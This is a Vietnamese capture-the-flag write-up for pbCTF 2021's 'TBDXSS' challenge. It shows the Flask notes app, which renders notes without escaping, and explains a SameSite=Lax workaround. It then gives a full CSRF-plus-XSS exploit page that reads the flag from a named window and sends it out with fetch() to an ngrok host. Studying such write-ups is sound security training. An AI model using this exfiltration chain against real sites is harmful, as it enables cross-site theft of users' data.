# PBCTF-2021
Link archive: `https://github.com/perfectblue/pbCTF-2021-challs`
## TBDXSS

### Source app.py:

```python
from flask import Flask, request, session, jsonify, Response
import json
import redis
import random
import os
import time

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "tops3cr3t")

app.config.update(
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax',
)

HOST = os.environ.get("CHALL_HOST", "localhost:5000")

r = redis.Redis(host='redis')

@app.after_request
def add_XFrame(response):
    response.headers['X-Frame-Options'] = "DENY"
    return response


@app.route('/change_note', methods=['POST'])
def add():
    session['note'] = request.form['data']
    session.modified = True
    return "Changed succesfully"

@app.route("/do_report", methods=['POST'])
def do_report():
    cur_time = time.time()
    ip = request.headers.get('X-Forwarded-For').split(",")[-2].strip() #amazing google load balancer
    last_time = r.get('time.'+ip) 
    last_time = float(last_time) if last_time is not None else 0
    
    time_diff = cur_time - last_time

    if time_diff > 6:
        r.rpush('submissions', request.form['url'])
        r.setex('time.'+ip, 60, cur_time)
        return "submitted"

    return "rate limited"

@app.route('/note')
def notes():
    print(session)
    return """
<body>
{}
</body>
    """.format(session['note'])

@app.route("/report", methods=['GET'])
def report():
    return """
<head>
    <title>Notes app</title>
</head>
<body>
    <h3><a href="/note">Get Note</a>&nbsp;&nbsp;&nbsp;<a href="/">Change Note</a>&nbsp;&nbsp;&nbsp;<a href="/report">Report Link</a></h3>
        <hr>
        <h3>Please report suspicious URLs to admin</h3>
        <form action="/do_report" id="reportform" method=POST>
        URL: <input type="text" name="url" placeholder="URL">
        <br>
        <input type="submit" value="submit">
        </form>
    <br>
</body>
    """

@app.route('/')
def index():
    return """
<head>
    <title>Notes app</title>
</head>
<body>
    <h3><a href="/note">Get Note</a>&nbsp;&nbsp;&nbsp;<a href="/">Change Note</a>&nbsp;&nbsp;&nbsp;<a href="/report">Report Link</a></h3>
        <hr>
        <h3> Add a note </h3>
        <form action="/change_note" id="noteform" method=POST>
        <textarea rows="10" cols="100" name="data" form="noteform" placeholder="Note's content"></textarea>
        <br>
        <input type="submit" value="submit">
        </form>
    <br>
</body>
    """
```

### Phân tích

Cookie được set một số biện pháp bảo mật:

```python
app.config.update(
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax',
)
```

Trong cookie khi send note: `set-cookie: session=eyJub3RlIjoidGVzdCBub3RlIn0.YWTZlQ.MDGimiI7SXUoUtHs1OtP-xATZyA; Secure; HttpOnly; Path=/; SameSite=Lax`

Khi thực hiện change note thì note sẽ đưuọc lưu vào session:
```python
@app.route('/change_note', methods=['POST'])
def add():
    session['note'] = request.form['data']
    session.modified = True
    return "Changed succesfully"
```

Request đến route note thì nó sẽ in ra note đã lưu mà không escape gì:

```python
@app.route('/note')
def notes():
    print(session)
    return """
<body>
{}
</body>
    """.format(session['note'])
```

Vậy ý tưởng ở đây là CSRF admin bot như sau:
- Để admin bot thực thi change_note thành nội dung chứa mã xss.
- Điều hướng admin bot đến route note để gửi flag về server của mình.

Bây giờ, ta có vấn đề với `SameSite=Lax` như sau:
- Làm sao để gửi request change_note kèm cookie?

`SameSite=Lax` có hai kiểu:
- Một là nếu chúng ta không set SameSite, browser sẽ tự động set `SameSite=Lax`. Tuy nhiên ta vẫn có thể sử dụng post trong form của html kèm cookie trong 2 phút đầu khi truy cập site. Và điều hướng cấp cao hơn như window.open.
- Hai là máy chủ set `SameSite=Lax` trực tiếp, khi đó ta chỉ có thể gửi kèm cookie bằng điều hướng cao nhất là window.open.

Do đó, ở đây ta có thể sử dụng phương pháp window.open:
```html

```

### Exploit

Tham khảo payload trên [ctftime](https://ctftime.org/writeup/30882):
```html
<body>
    <p>hello world</p>
    <form action="https://tbdxss.chal.perfect.blue/change_note" id="noteform" method=POST target="_blank">
        <textarea id="payload" rows="10" cols="100" name="data" form="noteform"></textarea>
        <input type="submit" value="submit">
    </form>
    <script>
        window.open('https://tbdxss.chal.perfect.blue/note', 'flagWindow');

        // this POSTs the above form with an XSS note value to read and exfiltrate the flag
        // note: we must use \x3C as an alternate form of the "less than" character to avoid
        //       browser parser confusion inside
        payload.value = "\x3Cscript>let flagWindow = window.open('', 'flagWindow'); let flag = flagWindow.document.documentElement.innerText; fetch('http://8709-68-51-145-201.ngrok.io/?flag=' + flag);\x3C/script>";
        noteform.submit();

        // Run this code after a 5 second delay to ensure the above POST has completed
        // before we reload our XSS payload into *this* page.
        setTimeout(()=> {
            // This loads our previously-posted XSS which will read the flag from the
            // previously-opened window and exfiltrate it.
            window.location.href = 'https://tbdxss.chal.perfect.blue/note';
        }, 5000)
        //<img src="some-url-that-takes-5-seconds-and-then-returns-a-404" onerror="window.location.href = 'https://tbdxss.chal.perfect.blue/note'">
    </script>
</body>
```

Giải thích payload trên:
* Khởi tạo một form.
* Đầu tiên cờ đã chứa trên trang `https://tbdxss.chal.perfect.blue/note` nên sẽ thực hiện mở cửa sổ `window.open('https://tbdxss.chal.perfect.blue/note', 'flagWindow');`
* Tiếp theo submit form với payload trên.
* Bây giờ nếu bot truy cập đến `https://tbdxss.chal.perfect.blue/note` thì sẽ bị trigger xss. Nên ta đặt một `window.location.href = 'https://tbdxss.chal.perfect.blue/note';` với setTimeout để chắc chắn rằng đoạn phía trên thực thi xong rồi mới truy cập.

CSRF skills:
```js
window.open('https://tbdxss.chal.perfect.blue/note', 'flagWindow');//Tạo một cửa sổ mới với tên là flagWindow
window.open('', 'flagWindow');//Đi đến cửa số đó.
```

`\x3Cscript>` Tránh browser parse gây lỗi.

Nếu như ta `let flagWindow = window.open('', 'flagWindow');` thì nó không đi đến cửa sổ, nó sẽ vẫn ở cửa sổ hiện tại tuy nhiên có thể thao tác với tab flagWindow, ta lợi dụng điều này để exiltrate data.

`flagWindow.document.documentElement.innerText` Hoặc có thể sử dụng `window.document.body.textContent` hoặc `flagWindow.document.body.innerText`: Lấy ra toàn bộ text trong DOM của cửa sổ flagWindow. Bài này cờ được gắn trong note nên lấy ra innerText là được. 

`window.location.href = 'https://tbdxss.chal.perfect.blue/note';` Điều hướng đến trang `https://tbdxss.chal.perfect.blue/note`.